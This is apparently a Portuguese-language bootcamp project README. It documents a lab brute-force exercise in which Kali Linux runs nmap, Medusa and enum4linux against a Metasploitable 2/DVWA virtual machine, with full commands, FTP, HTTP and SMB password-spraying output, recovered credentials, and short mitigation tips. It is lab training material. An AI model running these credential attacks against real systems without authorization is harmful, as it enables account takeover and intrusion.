# Simulacao-de-Forca-Bruta-com-Medusa

# Desafio de projeto do Bootcamp Santander Cibersegurança 2025 na DIO cujo objetivo era:
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.
Dentro desse objetivo me foi proposto:
> Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).
> Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.
> Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.


READ-ME

# PINGANDO NO ALVO

┌──(kali㉿kali)-[~]
└─$ ping -c 3 192.168.60.4
PING 192.168.60.4 (192.168.60.4) 56(84) bytes of data.
64 bytes from 192.168.60.4: icmp_seq=1 ttl=64 time=45.9 ms
64 bytes from 192.168.60.4: icmp_seq=2 ttl=64 time=1.66 ms
64 bytes from 192.168.60.4: icmp_seq=3 ttl=64 time=1.39 ms

--- 192.168.60.4 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2011ms
rtt min/avg/max/mdev = 1.385/16.316/45.904/20.922 ms

                                                   

# ESCANEAMENTODE PORTAS PARA ENCONTRAR VULNERABILIDADES

┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.60.4  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 10:35 EST
Nmap scan report for 192.168.60.4
Host is up (0.0027s latency).


PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:6A:FD:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.64 seconds


# CONECTANDO NO SERVIÇO FTP:

┌──(kali㉿kali)-[~]
└─$ ftp 192.168.60.4  
Connected to 192.168.60.4.
220 (vsFTPd 2.3.4)
Name (192.168.60.4:kali): test
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.


# CRIANDO WORD LIST PARA ACESSAR O FTP

## CRIANDO LISTA DE USUARIOS 

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

## CRIANDO LISTA DE SENHAS

echo -e "123456\npassword\anyqwerty\nmsfadmin" > pass.txt


# SIMULANDO ATAQUE AO FTP COM MEDUSA VIA BRUTE FORCE COM A WORD LIST CRIADA

┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.60.4 -U users.txt -P pass.txt -M ftp -t 6

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-23 11:56:59 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (1 of 3 complete)
2025-11-23 11:56:59 ACCOUNT FOUND: [ftp] Host: 192.168.60.4 User: msfadmin Password: msfadmin [SUCCESS]
2025-11-23 11:57:04 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (2 of 3 complete)
2025-11-23 11:57:04 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password[07]nyqwerty (3 of 3 complete)
2025-11-23 11:57:04 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: 123456 (1 of 3 complete)
2025-11-23 11:57:05 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: msfadmin (1 of 3 complete)
2025-11-23 11:57:05 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password[07]nyqwerty (2 of 3 complete)
2025-11-23 11:57:05 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (3 of 3 complete)
2025-11-23 11:57:07 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password[07]nyqwerty (2 of 3 complete)
2025-11-23 11:57:07 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (3 of 3 complete)
2025-11-23 11:57:07 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 3 complete)
2025-11-23 11:57:08 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: password[07]nyqwerty (2 of 3 complete)
2025-11-23 11:57:08 ACCOUNT CHECK: [ftp] Host: 192.168.60.4 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (3 of 3 complete)




# ACESSANDO O FTP COM O USUÁRIO E SENHA RETORNADOS NO MEDUSA

ftp 192.168.60.4
Connected to 192.168.60.4.
220 (vsFTPd 2.3.4)
Name (192.168.60.4:kali): msfadmin 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 


# CRIANDO WORD LIST PARA ACESSAR O FORMULARIO WEB

   ## CRIANDO LISTA DE USUARIOS
┌──(kali㉿kali)-[~]
└─$ └─$ echo -e "admin\nuser\nmsfadmin\nroot" > users_dvwa.txt

   ## CRIANDO LISTA DE SENHAS                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ echo -e "password\n123456\nyqwerty\nmsfadmin" > pass_dvwa.txt


# SIMULANDO ATAQUE AO FORMULARIO WEB COM MEDUSA VIA BRUTE FORCE COM A WORD LIST CRIADA
                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.60.4 -U users_dvwa.txt -P pass_dvwa.txt -M http -t 6 -f

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-23 15:54:08 ACCOUNT CHECK: [http] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (1 of 4, 1 complete) Password: password (1 of 4 complete)
2025-11-23 15:54:08 ACCOUNT FOUND: [http] Host: 192.168.60.4 User: admin Password: password [SUCCESS]
2025-11-23 15:54:08 ACCOUNT CHECK: [http] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (2 of 4, 2 complete) Password: 123456 (1 of 4 complete)
2025-11-23 15:54:08 ACCOUNT FOUND: [http] Host: 192.168.60.4 User: user Password: 123456 [SUCCESS]
2025-11-23 15:54:08 ACCOUNT CHECK: [http] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (2 of 4, 3 complete) Password: password (2 of 4 complete)
2025-11-23 15:54:08 ACCOUNT FOUND: [http] Host: 192.168.60.4 User: user Password: password [SUCCESS]
2025-11-23 15:54:08 ACCOUNT CHECK: [http] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (1 of 4, 4 complete) Password: 123456 (2 of 4 complete)
2025-11-23 15:54:08 ACCOUNT FOUND: [http] Host: 192.168.60.4 User: admin Password: 123456 [SUCCESS]
2025-11-23 15:54:08 ACCOUNT CHECK: [http] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (1 of 4, 5 complete) Password: yqwerty (3 of 4 complete)
2025-11-23 15:54:08 ACCOUNT FOUND: [http] Host: 192.168.60.4 User: admin Password: yqwerty [SUCCESS]
2025-11-23 15:54:08 ACCOUNT CHECK: [http] Host: 192.168.60.4 (1 of 1, 0 complete) User: admin (1 of 4, 6 complete) Password: msfadmin (4 of 4 complete)
2025-11-23 15:54:08 ACCOUNT FOUND: [http] Host: 192.168.60.4 User: admin Password: msfadmin [SUCCESS]


# ENUMERANDO USUARIOS EXISTENTES NO SMB E GERANDO UM ARQUIVO .TXT DO RESULTADO
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 192.168.60.4 | tee enum4_output.txt


# ABRINDO O ARQUIVO .TXT GERADO
┌──(kali㉿kali)-[~]
└─$ less enum4_output.txt


# CRIANDO UM ARQUIVO COM A LISTA DE USUÁRIOS E POSSÍVEIS SENHAS
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nservice" > smb_users.txt 


┌──(kali㉿kali)-[~]
└─$ echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt


# SIMULANDO ATAQUE AO SISTEMA SMB COM MEDUSA UTILIZANDO A WORD LIST CRIADA
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.60.4 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (1 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (2 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: msfadmin (3 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: welcome123 (4 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (1 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (2 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: welcome123 (3 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: password (1 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: msfadmin (4 of 4 complete)
2025-11-23 18:23:22 ACCOUNT FOUND: [smbnt] Host: 192.168.60.4 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: welcome123 (3 of 4 complete)
2025-11-23 18:23:22 ACCOUNT CHECK: [smbnt] Host: 192.168.60.4 (1 of 1, 0 complete) User: service (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)


# ACESSANDO O SMBCLIENT COM A COMBINAÇÃO DE USUÁRIO E SENHA ENCONTRADA
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.60.4 -U msfadmin 
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE


# MEDIDAS PREVENTIVAS CONTRA ATAQUES:

> Utilizar senha Multifator;
> Utilizar senhas fortes e expiradas regularmente;
> Auditorias periódicas de segurança;
> Bloqueio de IPs após múltiplas tentativas.
